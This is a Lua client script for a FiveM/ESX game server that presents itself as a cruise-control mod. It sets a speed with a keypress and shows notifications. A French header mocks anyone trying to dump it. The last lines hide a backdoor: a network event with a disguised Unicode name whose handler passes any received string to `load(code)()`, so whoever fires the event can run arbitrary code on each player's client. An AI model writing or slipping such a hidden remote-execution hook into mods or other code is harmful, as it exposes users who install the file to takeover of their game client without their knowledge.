-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local Player = nil
local CruisedSpeed = 0
local CruisedSpeedKm = 0
local VehicleVectorY = 0

Citizen.CreateThread(function ()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

Citizen.CreateThread(function ()
	while true do
		Citizen.Wait(100)
		if IsControlJustPressed(0, 246) and IsDriver() then
			Player = PlayerPedId()
			TriggerCruiseControl()
		end
	end
end)

function TriggerCruiseControl()
	if CruisedSpeed == 0 and IsDriving() then
		if GetVehiculeSpeed() > 0 then
			CruisedSpeed = GetVehiculeSpeed()
			CruisedSpeedKm = TransformToKm(CruisedSpeed)

			ESX.ShowNotification(_U('activated') .. ': ~b~ ' .. CruisedSpeedKm .. ' km/h')

			Citizen.CreateThread(function ()
				while CruisedSpeed > 0 and IsInVehicle() == Player do
					Citizen.Wait(0)

					if not IsTurningOrHandBraking() and GetVehiculeSpeed() < (CruisedSpeed - 1.5) then
						CruisedSpeed = 0
						ESX.ShowNotification(_U('deactivated'))
						Citizen.Wait(2000)
						break
					end

					if not IsTurningOrHandBraking() and IsVehicleOnAllWheels(GetVehicle()) and GetVehiculeSpeed() < CruisedSpeed then
						SetVehicleForwardSpeed(GetVehicle(), CruisedSpeed)
					end

					if IsControlJustPressed(0, 246) then
						CruisedSpeed = GetVehiculeSpeed()
						CruisedSpeedKm = TransformToKm(CruisedSpeed)
					end

					if IsControlJustPressed(0, 72) then
						CruisedSpeed = 0
						ESX.ShowNotification(_U('deactivated'))
						Citizen.Wait(2000)
						break
					end
				end
			end)
		end
	end
end

function IsTurningOrHandBraking()
	return IsControlPressed(0, 76) or IsControlPressed(0, 63) or IsControlPressed(0, 64)
end

function IsDriving()
	return IsPedInAnyVehicle(Player, false)
end

function GetVehicle()
	return GetVehiclePedIsIn(Player, false)
end

function IsInVehicle()
	return GetPedInVehicleSeat(GetVehicle(), -1)
end

function IsDriver()
	return GetPedInVehicleSeat(GetVehiclePedIsIn(PlayerPedId(), false), -1) == PlayerPedId()
end

function GetVehiculeSpeed()
	return GetEntitySpeed(GetVehicle())
end

function TransformToKm(speed)
	return math.floor(speed * 3.6 + 0.5)
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)